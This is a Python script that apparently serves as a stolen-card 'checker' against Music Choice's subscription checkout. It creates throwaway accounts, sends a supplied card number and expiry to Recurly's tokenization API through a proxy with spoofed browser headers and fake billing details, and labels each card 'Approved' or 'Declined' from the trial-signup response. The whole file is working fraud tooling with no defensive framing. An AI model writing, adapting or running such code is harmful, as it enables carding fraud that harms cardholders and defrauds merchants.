import uuid
from faker import Faker
from httpx import AsyncClient

async def recurly3(cc,mes,ano,cvv,proxyg):
    async with AsyncClient(verify=False,proxy=proxyg) as web:
        email = uuid.uuid4().hex + '@gmail.com'
        fake = Faker()
        headers = {
            'accept': 'application/json, text/plain, */*',
            'accept-language': 'es-ES,es;q=0.9,en;q=0.8',
            'cache-control': 'no-cache',
            'pragma': 'no-cache',
            'priority': 'u=1, i',
            'referer': 'https://goto.musicchoice.com/subscribe?msoid=undefined',
            'sec-ch-ua': '"Google Chrome";v="131", "Chromium";v="131", "Not_A Brand";v="24"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36',
        }

        params = {
            'msoid': '186',
            'productid': '2',
        }

        req1 = await web.get('https://goto.musicchoice.com/api/products/promos', params=params, headers=headers)

        headers = {
            'accept': 'application/json, text/plain, */*',
            'accept-language': 'es-ES,es;q=0.9,en;q=0.8',
            'cache-control': 'no-cache',
            'content-type': 'application/json',
            # 'cookie': 'ARRAffinity=15261986bca220bb5870757f72e03720963ae72a251020db68809343d486828f; ARRAffinitySameSite=15261986bca220bb5870757f72e03720963ae72a251020db68809343d486828f; ai_user=LntGrIHLksqDkmDP6q1veA|2024-12-17T01:17:01.276Z; mp_38a4a8b80fbfea7d6daf8ab62d590354_mixpanel=%7B%22distinct_id%22%3A%20%22vOd%2Bvs0tDdE%3D%22%2C%22%24device_id%22%3A%20%22193d22e93964b4-0eebaa08faa6e7-26011851-1fa400-193d22e93964b4%22%2C%22%24initial_referrer%22%3A%20%22%24direct%22%2C%22%24initial_referring_domain%22%3A%20%22%24direct%22%2C%22__mps%22%3A%20%7B%7D%2C%22__mpso%22%3A%20%7B%22%24initial_referrer%22%3A%20%22%24direct%22%2C%22%24initial_referring_domain%22%3A%20%22%24direct%22%7D%2C%22__mpus%22%3A%20%7B%7D%2C%22__mpa%22%3A%20%7B%7D%2C%22__mpu%22%3A%20%7B%7D%2C%22__mpr%22%3A%20%5B%5D%2C%22__mpap%22%3A%20%5B%5D%2C%22Platform%22%3A%20%22Dashboard%22%2C%22Device%22%3A%20%22Desktop%22%2C%22%24user_id%22%3A%20%22vOd%2Bvs0tDdE%3D%22%2C%22Max%20Rating%22%3A%20%22TV-MA%22%7D; _ga=GA1.1.823289663.1734398221; moe_uuid=4e0fb37f-63cc-40ae-8cd4-f4ad9379ccfa; ai_session=UOgefDy8VgSDTPc2ZSIrrX|1734398088372|1734398285802; _ga_6ZC21JY7JS=GS1.1.1734398221.1.1.1734398289.0.0.0',
            'origin': 'https://goto.musicchoice.com',
            'pragma': 'no-cache',
            'priority': 'u=1, i',
            'referer': 'https://goto.musicchoice.com/subscribe/checkout',
            'sec-ch-ua': '"Google Chrome";v="131", "Chromium";v="131", "Not_A Brand";v="24"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36',
        }

        json_data = {
            'Email': email,
            'Password': 'P4zFMhbMqn43Rs$',
            'SellPersonalData': True,
        }

        req2 = await web.post('https://goto.musicchoice.com/api/account/create', headers=headers, json=json_data)
        accountcode = req2.text.split('"ConsumerProfileId":"')[1].split('"')[0]
        
        json_data = {
            'MvpdId': 186,
            'Sku': 'MCAudio02Trial',
            'SubscriptionSkuId': 22,
            'BillingPartnerId': 3,
            'Platform': 'Web',
            'AddOns': [
                {
                    'Sku': 'MCKAR01Trial',
                    'SubscriptionSkuId': 4,
                },
            ],
        }

        response = await web.post('https://goto.musicchoice.com/api/products/validate', headers=headers, json=json_data)        
        billingaccountid = response.text.split('"BillingAccountId":"')[1].split('"')[0]
        print(billingaccountid)
        
        headers = {
            'accept': '*/*',
            'accept-language': 'es-ES,es;q=0.9,en;q=0.8',
            'cache-control': 'no-cache',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://api.recurly.com',
            'pragma': 'no-cache',
            'priority': 'u=1, i',
            'referer': 'https://api.recurly.com/js/v1/field.html',
            'sec-ch-ua': '"Google Chrome";v="131", "Chromium";v="131", "Not_A Brand";v="24"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36',
        }

        data = f'first_name=Sebastian&last_name=Gutierrez&address1=103-105%20Central%20Avenue&address2=&city=Orange&state=NJ&country=US&postal_code=07050-3824&number={cc}&fraud[0][processor]=fraudnet&fraud[0][session_id]=7540fcd2bc8f296e0bb5934cddb48f2c&browser[color_depth]=24&browser[java_enabled]=false&browser[language]=es-ES&browser[referrer_url]=https%3A%2F%2Fgoto.musicchoice.com%2Fsubscribe%2Fcheckout&browser[screen_height]=1080&browser[screen_width]=1920&browser[time_zone_offset]=420&browser[user_agent]=Mozilla%2F5.0%20%28Windows%20NT%2010.0%3B%20Win64%3B%20x64%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F131.0.0.0%20Safari%2F537.36&month={mes}&year={ano}&cvv=&version=4.32.5&key=ewr1-bLz2D8cBvax7bf5CmuMfVW&deviceId=hofVTKNznda1BcFW&sessionId=RocZOVnaDWpUucdH&instanceId=kez6HxFNIZr55hYW'

        req3 = await web.post('https://api.recurly.com/js/v1/token', headers=headers, data=data) #type: ignore
        token = req3.text.split('"id":"')[1].split('"')[0]

        headers = {
            'accept': 'application/json, text/plain, */*',
            'accept-language': 'es-ES,es;q=0.9,en;q=0.8',
            'cache-control': 'no-cache',
            'content-type': 'application/json',
            'origin': 'https://goto.musicchoice.com',
            'pragma': 'no-cache',
            'priority': 'u=1, i',
            'referer': 'https://goto.musicchoice.com/subscribe/checkout',
            'sec-ch-ua': '"Google Chrome";v="131", "Chromium";v="131", "Not_A Brand";v="24"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36',
        }

        json_data = {
            'planCode': 'mc-audio-only-monthly',
            'accountCode': billingaccountid,
            'billingInfoId': token,
            'firstName': fake.first_name(),
            'lastName': fake.last_name(),
            'email': email,
            'addons': [
                'mc-karaoke-monthly-free-trial',
            ],
            'hasTrial': True,
        }

        req4 = await web.post('https://goto.musicchoice.com/api/recurly/subscribe-recurly',headers=headers,json=json_data)
        print(req4.text)
        if "subscription_add_on" in req4.text:
            status = "Approved ✅"
            mensaje = "Approved $0.00"
        else:
            mensaje = req4.text
            if "Insufficient Funds" in mensaje:
                status = "Approved ✅"
            else:
                status = "Declined ❌"
        return status,mensaje
